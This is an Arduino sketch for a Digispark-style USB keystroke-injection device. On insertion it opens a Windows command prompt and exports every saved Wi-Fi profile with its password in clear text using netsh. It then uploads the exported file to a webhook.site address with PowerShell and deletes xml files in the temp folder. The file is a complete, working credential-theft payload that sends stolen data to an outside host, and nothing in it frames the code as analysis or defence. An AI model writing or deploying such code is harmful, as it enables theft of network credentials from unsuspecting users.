#include "DigiKeyboardFr.h"

#define URL "https://webhook.site/90434e67-f3fb-4be5-9355-3f0c24cff4e9"
#define TMP_FILE "tmp_wifi.xml"

const short time_default = 500;
const short time_run = 2000;
const char led_id = 1;

void setup() {
  pinMode(led_id, OUTPUT);
}

void loop() {
  digitalWrite(led_id, LOW);
  DigiKeyboardFr.update();
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.delay(time_default);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(time_default);
  DigiKeyboardFr.println("cmd");
  DigiKeyboardFr.delay(time_run);
  DigiKeyboardFr.println("cd %temp% & del *.xml /s /f /q & netsh wlan export profile key=clear & copy *.xml "TMP_FILE" & powershell Invoke-WebRequest -Uri "URL" -Method POST -InFile "TMP_FILE" & exit");
  digitalWrite(led_id, HIGH);
  for (;;) {
  }
}
